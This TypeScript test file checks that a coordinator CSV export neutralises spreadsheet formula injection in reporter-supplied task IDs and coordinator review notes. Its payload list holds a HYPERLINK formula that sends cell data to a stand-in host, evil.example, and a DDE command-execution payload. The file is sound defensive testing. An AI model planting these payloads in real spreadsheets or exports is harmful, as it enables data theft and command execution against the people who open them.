// csv-injection.test.ts: the coordinator CSV export must not hand a spreadsheet a formula.
//
// taskId reaches toCsv() straight from a reporter's SIGNED PAYLOAD, and anyone can generate a
// key and sign a proof — there is no registration. So this is unauthenticated input landing in
// the spreadsheet of the programme officer who opens the export. Verified against the previous
// code: =HYPERLINK(...), =cmd|'/c calc'!A1, +1+1, -2+3, @SUM(1+1) and a leading tab were all
// written as live formulas.
//
// reviewNote is coordinator-written and covered too: a coordinator export should not be able to
// attack another coordinator either.

import { test } from "node:test";
import assert from "node:assert/strict";
import { CSV_HEADER, toCsv, type CoordinatorRow } from "../src/coordinator.js";

const ATTACKS = [
  '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
  "=cmd|'/c calc'!A1",
  "+1+1",
  "-2+3",
  "@SUM(1+1)",
  "\tformula",
  "\rformula",
  "=1+1",
];

function row(o: Partial<CoordinatorRow> = {}): CoordinatorRow {
  return {
    proofHash: "a".repeat(64),
    taskId: "solar-panel-installation",
    geohashRegion: "u4pru",
    capturedAt: "2026-01-01T00:00:00Z",
    attestationCount: 0,
    reviewStatus: "pending",
    reviewNote: "",
    reviewedAt: "",
    ...o,
  };
}

/** The data cells of the single row in a one-row CSV. */
function cellsOf(csv: string): string[] {
  const lines = csv.split("\r\n");
  assert.equal(lines.length, 2, "expected a header and one row");
  return lines[1]!.split(",");
}

for (const attack of ATTACKS) {
  test(`a reporter-supplied taskId cannot become a formula: ${JSON.stringify(attack.slice(0, 20))}`, () => {
    const csv = toCsv([row({ taskId: attack })]);
    const body = csv.split("\r\n")[1]!;
    // Every occurrence of the payload must be preceded by the neutralising quote.
    const idx = body.indexOf(attack.replace(/"/g, '""'));
    assert.ok(idx > 0, "the value should still be present, just inert");
    assert.equal(body[idx - 1], "'", `${JSON.stringify(attack)} was written as a live formula`);
  });

  test(`a coordinator-written reviewNote cannot become a formula: ${JSON.stringify(attack.slice(0, 20))}`, () => {
    const body = toCsv([row({ reviewNote: attack })]).split("\r\n")[1]!;
    const idx = body.indexOf(attack.replace(/"/g, '""'));
    assert.ok(idx > 0);
    assert.equal(body[idx - 1], "'");
  });
}

test("ordinary values are untouched — no stray quote is added", () => {
  const cells = cellsOf(toCsv([row()]));
  assert.equal(cells[1], "solar-panel-installation");
  assert.equal(cells[2], "u4pru");
  assert.equal(cells[3], "2026-01-01T00:00:00Z");
  assert.ok(!cells.some((c) => c.startsWith("'")), "nothing benign should be prefixed");
});

test("a value that merely CONTAINS = or @ is not prefixed — only a leading one matters", () => {
  const cells = cellsOf(toCsv([row({ taskId: "pump=repair@site" })]));
  assert.equal(cells[1], "pump=repair@site");
});

test("RFC 4180 escaping still holds alongside the guard", () => {
  const csv = toCsv([row({ reviewNote: 'has "quotes", a comma\nand a newline' })]);
  assert.ok(csv.includes('"has ""quotes"", a comma\nand a newline"'));
  assert.equal(csv.split("\r\n")[0], CSV_HEADER.join(","));
});

test("a neutralised value that also needs quoting gets both treatments", () => {
  const body = toCsv([row({ reviewNote: '=HYPERLINK("x","y")' })]).split("\r\n")[1]!;
  assert.ok(body.includes(`"'=HYPERLINK(""x"",""y"")"`), `got: ${body}`);
});

test("an empty cell stays empty", () => {
  const cells = cellsOf(toCsv([row({ reviewNote: "", reviewedAt: "" })]));
  assert.equal(cells[6], "");
  assert.equal(cells[7], "");
});
